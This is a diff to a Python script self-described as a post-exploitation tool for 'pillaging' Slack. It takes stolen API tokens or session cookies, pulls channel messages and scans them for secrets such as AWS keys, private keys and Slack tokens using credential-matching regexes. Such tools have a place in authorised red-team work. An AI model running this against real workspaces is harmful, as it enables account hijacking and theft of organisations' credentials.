@@ -15,7 +15,8 @@ import json
 verbose = False
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
+# contants taken directly from slackpirate 
+# default these are not being used but still included if user decides not to use supplied library 
 ALREADY_SIGNED_IN_TEAM_REGEX = r"([a-zA-Z0-9\-]+\.slack\.com)"
 SLACK_API_TOKEN_REGEX = r"(xox[a-zA-Z]-[a-zA-Z0-9-]+)"
 WORKSPACE_VALID_EMAILS_REGEX = r"email-domains-formatted=\"(@.+?)[\"]"
@@ -464,17 +465,6 @@ def unix_timestamp_to_human_readable(epoch_time):
     except ValueError:
         return "N/A"
 
-
-
-
-
-
-
-
-
-
-
-
 def pillage_conversations(credentials, proxy, verify_ssl=False):
     all_conversations = list_channels(credentials, proxy=proxy, verify_ssl=verify_ssl)
 
@@ -488,7 +478,6 @@ def pillage_conversations(credentials, proxy, verify_ssl=False):
         for message in messages:
             text = message.get('text', '')
             find_secrets_in_text(text, secrets_collection)
-
 
 
 def retrieve_conversation_messages(credentials, conversation_id, proxy, verify_ssl=False):
@@ -513,8 +502,6 @@ def retrieve_conversation_messages(credentials, conversation_id, proxy, verify_s
     else:
         print(f"Error retrieving messages for conversation {conversation_id}")
         return []
-
-
 
 
 def find_secrets_in_text(text, secrets_collection):
@@ -543,9 +530,21 @@ def find_secrets_in_text(text, secrets_collection):
                 print(f"Unexpected secret format: {secret}")
 
 
+"""
+# uses regex constants declared at beginning of script if you ever decide to not use detect-secrets lib
 
+def find_secrets_in_text(text):
+    already_signed_in_team_match = re.search(ALREADY_SIGNED_IN_TEAM_REGEX, text)
+    slack_api_token_match = re.search(SLACK_API_TOKEN_REGEX, text)
+    workspace_valid_emails_match = re.search(WORKSPACE_VALID_EMAILS_REGEX, text)
+    private_keys_match = re.search(PRIVATE_KEYS_REGEX, text)
+    s3_match = re.search(S3_REGEX, text)
+    credentials_match = re.search(CREDENTIALS_REGEX, text)
+    aws_keys_match = re.search(AWS_KEYS_REGEX, text)
 
-
+    if already_signed_in_team_match or slack_api_token_match or workspace_valid_emails_match or private_keys_match or s3_match or credentials_match or aws_keys_match:
+        print(f"Potential secret found in message: {text}")
+"""
 
 
 
@@ -553,14 +552,19 @@ def find_secrets_in_text(text, secrets_collection):
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Download files from Slack channels")
+    parser = argparse.ArgumentParser(
+        description="Post-exploitation script for enumerating and pillaging slack",
+        usage="%(prog)s [--token TOKEN | --cookie COOKIE --workspace-url WORKSPACE_URL] --pillage",
+    )
+
+    auth_group = parser.add_argument_group("Authentication")
+    auth_group.add_argument("--token", type=str, help="Slack API (bot) token")
+    auth_group.add_argument("--cookie", type=str, help="User-supplied cookie (xoxb), automates xoxc conversion for you")
+    auth_group.add_argument("--user-cookie", type=str, help="User session cookie (e.g., xoxd-...)")
+    auth_group.add_argument("--workspace-url", type=str, help="Workspace URL for authenticating user session token")
+
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument("--token", type=str, help="Slack API token")
-    group.add_argument("--cookie", type=str, help="User-supplied cookie")
-    group.add_argument("--user-cookie", type=str, help="User session cookie (e.g., xoxd-...)")
-    parser.add_argument("--workspace-url", type=str, help="Workspace URL for authenticating user session token")
-    
-    parser.add_argument("--pillage", action='store_true', help="Search conversations for secrets")
+    group.add_argument("--pillage", action='store_true', help="Search conversations for secrets")
 
     parser.add_argument("--test", action='store_true', help="Test Slack credentials")
     parser.add_argument("--list-file-urls", action='store_true', help="Get file URLs")
@@ -576,7 +580,11 @@ def main():
 
     args = parser.parse_args()
 
-    args = parser.parse_args()
+    # Check if --cookie is supplied, then --workspace-url is required
+    if args.cookie and not args.workspace_url:
+        parser.error("--workspace-url is required when --cookie is supplied.")
+
+
 
     secrets_collection = SecretsCollection()
 
